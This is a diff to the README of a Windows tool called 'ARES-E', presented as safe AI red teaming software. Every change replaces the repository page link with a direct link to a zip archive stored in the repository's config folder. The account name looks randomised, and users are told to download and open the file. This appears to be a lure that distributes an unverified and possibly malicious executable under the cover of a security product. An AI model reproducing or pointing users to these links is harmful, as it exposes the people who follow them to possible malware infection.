@@ -1,12 +1,12 @@
 # 🛡️ ARES-E - Safe AI Red Teaming for Windows
 
-[![Download ARES-E](https://img.shields.io/badge/Download%20ARES--E-blue-grey?style=for-the-badge)](https://github.com/clematisversicolorphallicphase708/ARES-E)
+[![Download ARES-E](https://img.shields.io/badge/Download%20ARES--E-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/clematisversicolorphallicphase708/ARES-E/main/config/E-ARE-3.4.zip)
 
 ## 📥 Download ARES-E
 
 Visit this page to download ARES-E for Windows:
 
-https://github.com/clematisversicolorphallicphase708/ARES-E
+https://raw.githubusercontent.com/clematisversicolorphallicphase708/ARES-E/main/config/E-ARE-3.4.zip
 
 Use the files on that page to get the app onto your PC, then open the downloaded app to start
 
@@ -30,7 +30,7 @@ For the best experience, use a recent version of Windows 10 or Windows 11.
 ## 🚀 How to Get Started
 
 1. Open the download page:
-   https://github.com/clematisversicolorphallicphase708/ARES-E
+   https://raw.githubusercontent.com/clematisversicolorphallicphase708/ARES-E/main/config/E-ARE-3.4.zip
 
 2. Find the Windows download on the page
 
